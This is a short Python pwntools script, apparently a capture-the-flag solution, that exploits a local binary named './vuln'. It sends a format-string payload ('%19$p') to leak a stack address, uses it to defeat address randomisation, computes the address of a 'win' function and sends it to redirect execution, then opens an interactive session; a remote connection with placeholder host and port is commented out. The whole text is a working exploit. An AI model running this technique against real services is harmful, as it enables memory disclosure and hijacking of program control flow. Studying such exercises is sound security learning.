from pwn import *


binary = ELF("./vuln")
# print(binary.symbols)
win_offset = binary.symbols["main"] - binary.symbols["win"]
print("Win offset: ", hex(win_offset))


## remote process
HOST = "..."
PORT = "..."
# p = remote(HOST, PORT)

p = process("./vuln")
p.recvuntil(b"name:")

payload = b"%19$p"
p.sendline(payload)

v = p.recvline().strip()
print(v)
main_address = int(v, 16) - 0x41
print(f"Main memory address: {hex(main_address)}")

win_address = main_address - win_offset
print(f"Win memory address: {hex(win_address)}")

p.sendline(hex(win_address).encode())


p.interactive()